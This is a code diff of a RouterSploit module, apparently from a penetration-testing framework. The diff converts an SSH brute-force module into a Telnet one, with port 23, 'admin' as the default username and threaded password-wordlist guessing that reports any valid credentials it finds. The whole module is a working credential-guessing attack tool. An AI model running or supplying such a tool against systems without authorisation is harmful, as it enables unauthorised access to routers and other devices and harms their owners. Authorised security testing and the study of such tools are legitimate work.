@@ -1,14 +1,13 @@
 import itertools
 from routersploit.core.exploit import *
-from routersploit.core.ssh.ssh_client import SSHClient
+from routersploit.core.telnet.telnet_client import TelnetClient
 from routersploit.resources import wordlists
-from routersploit.resources.wordlists.password_generator import PasswordGenerator
 
 
-class Exploit(SSHClient):
+class Exploit(TelnetClient):
     __info__ = {
-        "name": "SSH Bruteforce",
-        "description": "Module performs bruteforce attack against SSH service. "
+        "name": "Telnet Bruteforce",
+        "description": "Module performs bruteforce attack against Telnet service. "
                        "If valid credentials are found, they are displayed to the user.",
         "authors": (
             "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
@@ -19,11 +18,11 @@ class Exploit(SSHClient):
     }
 
     target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
-    port = OptPort(22, "Target SSH port")
+    port = OptPort(23, "Target Telnet port")
 
     threads = OptInteger(8, "Number of threads")
 
-    usernames = OptWordlist(wordlists.usernames, "Username or file with usernames (file://)")
+    usernames = OptWordlist("admin", "Username or file with usernames (file://)")
     passwords = OptWordlist(wordlists.passwords, "Password or file with passwords (file://)")
 
     stop_on_success = OptBool(True, "Stop on first valid authentication attempt")
@@ -38,19 +37,10 @@ class Exploit(SSHClient):
         if not self.check():
             return
 
-        print_status("Starting bruteforce attack against SSH service")
+        print_status("Starting bruteforce attack against Telnet service")
 
         data = LockedIterator(itertools.product(self.usernames, self.passwords))
         self.run_threads(self.threads, self.target_function, data)
-
-        password_generator = PasswordGenerator(11)
-
-        passwords = password_generator.new_passwords()
-
-        while passwords:
-            data = LockedIterator(itertools.product(self.usernames, passwords))
-            self.run_threads(self.threads, self.target_function, data)
-            passwords = password_generator.new_passwords()
 
         if self.credentials:
             print_success("Credentials found!")
@@ -63,24 +53,24 @@ class Exploit(SSHClient):
         while running.is_set():
             try:
                 username, password = data.next()
-                ssh_client = self.ssh_create()
-                if ssh_client.login(username, password):
+                telnet_client = self.telnet_create()
+                if telnet_client.login(username, password, retries=3):
                     if self.stop_on_success:
                         running.clear()
 
                     self.credentials.append((self.target, self.port, self.target_protocol, username, password))
-                    ssh_client.close()
+                    telnet_client.close()
 
             except StopIteration:
                 break
 
     def check(self):
-        ssh_client = self.ssh_create()
-        if ssh_client.test_connect():
-            print_status("Target exposes SSH service", verbose=self.verbosity)
+        telnet_client = self.telnet_create()
+        if telnet_client.test_connect():
+            print_status("Target exposes Telnet service", verbose=self.verbosity)
             return True
 
-        print_status("Target does not expose SSH", verbose=self.verbosity)
+        print_status("Target does not expose Telnet service", verbose=self.verbosity)
         return False
 
     @mute
